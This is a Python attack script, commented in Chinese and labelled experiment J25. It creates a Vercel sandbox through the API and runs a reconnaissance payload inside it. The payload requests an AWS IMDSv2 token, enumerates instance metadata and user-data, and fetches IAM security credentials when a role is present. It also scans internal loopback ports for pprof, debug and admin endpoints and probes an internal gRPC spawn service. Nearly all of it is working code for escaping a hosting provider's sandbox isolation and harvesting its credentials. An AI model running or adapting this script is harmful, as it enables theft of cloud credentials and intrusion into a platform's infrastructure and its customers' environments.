# 实验J25: IMDSv2 元数据全枚举(token 已通) + ::1 HTTP 服务路径枚举
# J24: Firecracker API + IMDSv2 token 成功 + 23456/30001 是 Go HTTP
# 目标: 1)IMDS: IAM 凭据/实例信息 2)::1 端口: pprof/管理路径
import json, base64, pathlib, time, urllib.request, urllib.error

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=180):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj25"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

RECON = r'''
import socket

def http_get(host, port, path, headers=None, timeout=4, raw=None):
    try:
        s = socket.socket(socket.AF_INET6 if ":" in host else socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if raw is not None:
            s.sendall(raw)
        else:
            hdrs = "".join(f"{k}: {v}\r\n" for k, v in (headers or {}).items())
            req = f"GET {path} HTTP/1.1\r\nHost: localhost\r\n{hdrs}\r\n".encode()
            s.sendall(req)
        data = b""
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
                if len(data) > 20000:
                    break
        except socket.timeout:
            pass
        s.close()
        return data
    except Exception as e:
        return b"ERR: " + str(e).encode()

# ---------- [1] IMDSv2 全枚举 ----------
print("=== [1] IMDSv2 枚举 ===", flush=True)
# 获取 token
s = socket.socket(); s.settimeout(3); s.connect(("169.254.169.254", 80))
s.sendall(b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\n\r\n")
d = b""
try:
    while True:
        c = s.recv(4096)
        if not c: break
        d += c
except socket.timeout: pass
s.close()
token = d.split(b"\r\n\r\n")[-1].strip().decode()
print("token:", token[:20], "...", flush=True)
H = {"X-aws-ec2-metadata-token": token}

paths = [
    "/latest/meta-data/",
    "/latest/meta-data/iam/",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/placement/availability-zone",
    "/latest/meta-data/local-ipv4",
    "/latest/meta-data/mac",
    "/latest/meta-data/network/interfaces/macs/",
    "/latest/meta-data/hostname",
    "/latest/meta-data/reservation-id",
    "/latest/meta-data/public-ipv4",
    "/latest/meta-data/services/domain",
    "/latest/dynamic/instance-identity/document",
    "/latest/user-data",
    "/latest/meta-data/ami-id",
    "/latest/meta-data/instance-type",
    "/latest/meta-data/iam/info",
]
for p in paths:
    d = http_get("169.254.169.254", 80, p, headers=H, timeout=3)
    body = d.split(b"\r\n\r\n")[-1] if b"\r\n\r\n" in d else d
    print(f"IMDS {p} -> {body[:400]!r}", flush=True)

# 如果有 iam 角色名, 拉凭据
d = http_get("169.254.169.254", 80, "/latest/meta-data/iam/security-credentials/", headers=H, timeout=3)
role = d.split(b"\r\n\r\n")[-1].strip() if b"\r\n\r\n" in d else b""
if role and role != b"":
    d2 = http_get("169.254.169.254", 80, f"/latest/meta-data/iam/security-credentials/{role.decode().strip()}", headers=H, timeout=3)
    cred_body = d2.split(b"\r\n\r\n")[-1] if b"\r\n\r\n" in d2 else d2
    print("CRED", repr(role), "->", repr(cred_body[:1500]), flush=True)

# ---------- [2] ::1 端口路径枚举 ----------
print("\n=== [2] ::1 端口路径枚举 ===", flush=True)
paths2 = [
    "/debug/pprof/", "/debug/pprof/goroutine?debug=1", "/debug/pprof/goroutine?debug=2",
    "/metrics", "/health", "/healthz", "/readyz", "/livez", "/status", "/version",
    "/info", "/ping", "/api/", "/v1/", "/v1/health", "/api/v1/", "/config",
    "/debug/vars", "/debug/requests", "/debug/events",
]
for port in (23456, 30001):
    print(f"--- ::1:{port} ---", flush=True)
    for p in paths2:
        d = http_get("::1", port, p, timeout=2)
        if b"ERR" in d[:8]:
            break
        status = d.split(b"\r\n")[0].decode(errors="replace") if d else "EMPTY"
        if "404" not in status:
            body = d.split(b"\r\n\r\n")[-1][:600] if b"\r\n\r\n" in d else d[:600]
            print(f"  {p} -> {status} | {body!r}", flush=True)

# ---------- [3] 30002 协议试探 ----------
print("\n=== [3] ::1:30002 协议 ===", flush=True)
s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
s.settimeout(3)
try:
    s.connect(("::1", 30002))
    s.sendall(b"POST /vercel.sandbox.v1.SpawnService/Ping HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/grpc\r\nContent-Length: 5\r\n\r\n\x00\x00\x00\x00\x00")
    d = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            d += c
    except socket.timeout: pass
    print("grpc probe:", repr(d[:500]), flush=True)
    s.close()
except Exception as e:
    print("30002 grpc ERR:", e, flush=True)
'''
run_cmd(sid, RECON, "imds-enum", wait=True, timeout=150000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
